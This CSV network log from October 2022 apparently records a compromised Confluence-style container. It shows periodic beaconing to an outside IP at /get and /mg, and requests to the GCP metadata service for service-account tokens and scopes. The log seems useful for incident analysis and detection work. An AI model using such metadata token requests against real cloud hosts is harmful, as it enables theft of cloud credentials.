"@timestamp","network.direction","source.ip","source.port","destination.port","destination.ip","bytes_in","bytes_out","network.protocol","url.path","url.full"
"Oct 25, 2022 @ 01:29:50.307",ingress,"127.0.0.1",43280,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:29:29.831",egress,"172.17.0.3",56554,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:29:20.295",ingress,"127.0.0.1",56468,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:29:09.938",egress,"172.17.0.3",51400,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:28:50.284",ingress,"127.0.0.1",56712,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:28:20.271",ingress,"127.0.0.1",44126,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:28:09.265",egress,"172.17.0.3",42538,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:27:59.154",egress,"172.17.0.3",43696,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:27:50.262",ingress,"127.0.0.1",57034,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:27:20.244",ingress,"127.0.0.1",38454,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:27:08.601",egress,"172.17.0.3",37270,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:26:50.236",ingress,"127.0.0.1",60546,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:26:28.481",egress,"172.17.0.3",43378,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:26:20.218",ingress,"127.0.0.1",47406,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:26:07.939",egress,"172.17.0.3",34294,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:25:50.205",ingress,"127.0.0.1",35460,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:25:20.196",ingress,"127.0.0.1",50876,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:25:07.270",egress,"172.17.0.3",55546,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:24:57.804",egress,"172.17.0.3",57902,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:24:50.014",ingress,"127.0.0.1",36466,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:24:20.005",ingress,"127.0.0.1",34454,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:24:06.600",egress,"172.17.0.3",50218,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:23:49.983",ingress,"127.0.0.1",45826,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:23:27.127",egress,"172.17.0.3",33268,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:23:19.962",ingress,"127.0.0.1",39146,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:23:05.926",egress,"172.17.0.3",41016,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:22:49.948",ingress,"127.0.0.1",43954,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:22:19.934",ingress,"127.0.0.1",35542,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:22:05.261",egress,"172.17.0.3",45554,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:21:56.448",egress,"172.17.0.3",54882,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:21:49.912",ingress,"127.0.0.1",56836,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:21:19.904",ingress,"127.0.0.1",43728,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:21:04.601",egress,"172.17.0.3",41372,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:20:49.893",ingress,"127.0.0.1",40864,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:20:25.769",egress,"172.17.0.3",59528,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:20:19.878",ingress,"127.0.0.1",39888,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:20:03.933",egress,"172.17.0.3",51214,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:19:49.864",ingress,"127.0.0.1",54604,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:19:19.854",ingress,"127.0.0.1",47022,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:19:03.262",egress,"172.17.0.3",41714,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:18:55.098",egress,"172.17.0.3",46872,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:18:49.830",ingress,"127.0.0.1",50230,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:18:35.119",ingress,"23.251.102.74",56572,8090,"172.17.0.3",204B,"65.9KB",http,"/","http://34.142.184.1:8090/"
"Oct 25, 2022 @ 01:18:19.806",ingress,"127.0.0.1",55162,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:18:02.598",egress,"172.17.0.3",35562,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:17:49.785",ingress,"127.0.0.1",52148,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:17:24.429",egress,"172.17.0.3",34346,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:17:19.769",ingress,"127.0.0.1",52938,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:17:01.940",egress,"172.17.0.3",57402,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:16:49.754",ingress,"127.0.0.1",48254,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:16:19.740",ingress,"127.0.0.1",60352,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:16:01.278",egress,"172.17.0.3",56028,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:15:53.757",egress,"172.17.0.3",37272,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:15:49.702",ingress,"127.0.0.1",47628,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:15:19.683",ingress,"127.0.0.1",60800,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:15:00.621",egress,"172.17.0.3",50676,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:14:49.607",ingress,"127.0.0.1",43934,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:14:23.089",egress,"172.17.0.3",56302,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:14:19.592",ingress,"127.0.0.1",36834,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:13:59.956",egress,"172.17.0.3",34858,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:13:49.583",ingress,"127.0.0.1",57202,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:13:19.576",ingress,"127.0.0.1",49150,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:12:59.284",egress,"172.17.0.3",53988,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:12:52.425",egress,"172.17.0.3",34078,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:12:49.572",ingress,"127.0.0.1",51678,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:12:19.566",ingress,"127.0.0.1",58712,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:11:58.616",egress,"172.17.0.3",58232,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:11:49.561",ingress,"127.0.0.1",59992,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:11:21.752",egress,"172.17.0.3",52412,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:11:19.555",ingress,"127.0.0.1",56032,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:10:57.942",egress,"172.17.0.3",59222,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:10:49.538",ingress,"127.0.0.1",32828,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:10:38.991",ingress,"172.17.0.3",42558,80,"169.254.169.254",180B,"1.3KB",http,"/computeMetadata/v1/instance/service-accounts/default//token","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default//token"
"Oct 25, 2022 @ 01:10:38.921",ingress,"172.17.0.3",42544,80,"169.254.169.254",181B,540B,http,"/computeMetadata/v1/instance/service-accounts/default//scopes","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default//scopes"
"Oct 25, 2022 @ 01:10:38.826",ingress,"172.17.0.3",42532,80,"169.254.169.254",183B,254B,http,"/computeMetadata/v1/instance/service-accounts/default//identity","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default//identity"
"Oct 25, 2022 @ 01:10:38.775",ingress,"172.17.0.3",42520,80,"169.254.169.254",182B,246B,http,"/computeMetadata/v1/instance/service-accounts/default//aliases","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default//aliases"
"Oct 25, 2022 @ 01:10:38.715",ingress,"172.17.0.3",42518,80,"169.254.169.254",180B,289B,http,"/computeMetadata/v1/instance/service-accounts/default//email","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default//email"
"Oct 25, 2022 @ 01:10:38.651",ingress,"172.17.0.3",42502,80,"169.254.169.254",223B,"1.3KB",http,"/computeMetadata/v1/instance/service-accounts/[email]//token","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/[email]//token"
"Oct 25, 2022 @ 01:10:38.602",ingress,"172.17.0.3",42498,80,"169.254.169.254",224B,540B,http,"/computeMetadata/v1/instance/service-accounts/[email]//scopes","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/[email]//scopes"
